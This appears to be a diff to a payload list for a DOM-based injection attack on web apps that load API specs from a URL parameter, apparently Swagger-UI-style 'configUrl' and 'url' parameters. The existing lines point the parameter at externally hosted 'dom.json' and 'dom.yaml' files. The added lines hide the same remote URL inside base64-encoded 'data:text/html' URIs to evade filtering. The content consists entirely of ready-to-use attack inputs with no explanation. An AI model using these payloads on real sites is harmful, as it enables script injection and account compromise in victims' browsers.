@@ -7,3 +7,8 @@
 ?configUrl=https://jumpy-floor.surge.sh/test.json
 
 /index.html?url=https://jacob2020baklas.github.io/test/dom.yaml
+
+==========
+
+[JSON] : example.com/api/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9qYWNvYjIwMjBiYWtsYXMuZ2l0aHViLmlvL3Rlc3QvZG9tLmpzb24iCn0=
+[YAML] : example.com/api/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9qYWNvYjIwMjBiYWtsYXMuZ2l0aHViLmlvL3Rlc3QvZG9tLnlhbWwiCn0=
